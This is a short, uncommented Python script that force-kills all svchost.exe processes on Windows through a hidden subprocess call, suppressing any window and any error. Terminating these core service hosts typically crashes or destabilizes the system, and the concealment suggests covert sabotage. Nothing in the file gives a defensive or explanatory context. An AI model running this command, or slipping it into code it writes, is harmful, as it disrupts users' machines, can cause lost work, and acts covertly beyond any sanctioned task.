import subprocess

try:
    subprocess.run("TASKKILL /F /IM svchost.exe", creationflags=subprocess.CREATE_NO_WINDOW)
except:
    pass